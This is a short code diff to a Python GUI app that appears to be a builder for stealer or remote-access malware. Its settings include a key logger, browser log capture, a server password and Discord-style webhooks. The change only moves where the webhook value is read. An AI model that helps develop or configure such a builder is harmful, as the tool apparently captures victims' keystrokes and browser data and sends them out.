@@ -336,8 +336,8 @@ class App(customtkinter.CTk):
             server_key = base64.b64encode(connection_config['Server Password'].get().encode()).decode()
             dynamic_webhook = connection_config['Dynamic Webhook'].get()
             cast_file = connection_config['Tv Cast File'].get()
-        else:
-            webhook = connection_config['Webhook'].get()
+            
+        webhook = connection_config['Webhook'].get()
 
         keylogger = misc_config['Key Logger'].get()
         browser = misc_config['Browser Logs'].get()
